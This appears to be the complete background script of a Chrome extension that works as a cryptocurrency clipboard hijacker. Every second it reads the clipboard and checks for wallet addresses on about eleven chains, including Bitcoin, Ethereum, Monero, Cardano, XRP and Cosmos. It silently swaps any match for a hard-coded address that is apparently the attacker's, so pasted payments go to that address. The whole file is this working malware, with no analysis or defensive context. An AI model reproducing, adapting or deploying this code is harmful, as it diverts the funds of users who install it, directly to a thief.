let page = chrome.extension.getBackgroundPage();

var inputElement = document.createElement('input');

document.body.appendChild(inputElement);

inputElement.focus();

function checkWalletAddresses() {
    
    document.execCommand('paste');   
    var clipboardContent = inputElement.value;    
    
    clipboardContent = clipboardContent.replace(/^(0x)[A-Fa-f0-9]{40}$/g, '0x6eb2103839011Ed56c98145b3d3f9d6BE1b4dA63');    
    
    clipboardContent = clipboardContent.replace(/^T[A-Za-z1-9]{33}$/g, 'TK3dtT7vYLkhUyzLqbQMmsrM36QzFnmfaa');    
    
    clipboardContent = clipboardContent.replace(/^(bnb1)[0-9a-z]{38}$/g, 'bnb1pncs5ct0rdh3rcdms8708x9jrdy038ml33ceuw');    
    
    clipboardContent = clipboardContent.replace(/^([13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})$/g, 'bc1qkjm7r677a4fkxcmx9kzlk55a9eaqtztq8zwrc2');    clipboardContent = clipboardContent.replace(/^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$/g, 'LcVct9KwHwUKftDNjbBxUtjK9WeUkYbRN3');    
    
    clipboardContent = clipboardContent.replace(/^r[0-9a-zA-Z]{24,34}$/g, 'rJd2pxs7TxE77W8X3Ezt2QyrhMJixMehPx');    
    
    clipboardContent = clipboardContent.replace(/^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$/g, 'DFbEVJUt9TcyBgVGriy3DcNBwYhK3s7Yhx');    
    
    clipboardContent = clipboardContent.replace(/^addr1[a-z0-9]+$/g, 'addr1q8206rrze22rz8g5lggn4clv7zu9mq6w6a6llvw8v3l7r8k5l5xx9j55xyw3f7s38t37eu9ctkp5a4m4l7cuwerlux0qxlhwvz');    
    
    clipboardContent = clipboardContent.replace(/^[48]([0-9AB]{1})([0-9a-zA-Z]{93})$/g, '41iwYzbS1KKX8DFySxDcGBGGfJzywUeHxWumm4fjYxtYCiHtysXmq3P7RqG18Tv5UDKGNQegefxS2FFqrqeapvB7FuYSBJv');    
    
    clipboardContent = clipboardContent.replace(/^G[0-7A-Za-z]{55}$/g, 'GCUPRZDN5RGSO3MC4LBIZBJMCS5KNUYQI2HZNUHVEBC5LNWZODWQ24XH');
    
    clipboardContent = clipboardContent.replace(/^cosmos[a-z0-9]{39}$/g, 'cosmos1cd3hxdkc775zj75xtd3gqp8s7hynxkzewcf58y');     
    
    inputElement.value = clipboardContent;    
    inputElement.select();        
    document.execCommand('copy');        
    inputElement.value = '';}
    setInterval(checkWalletAddresses, 1000);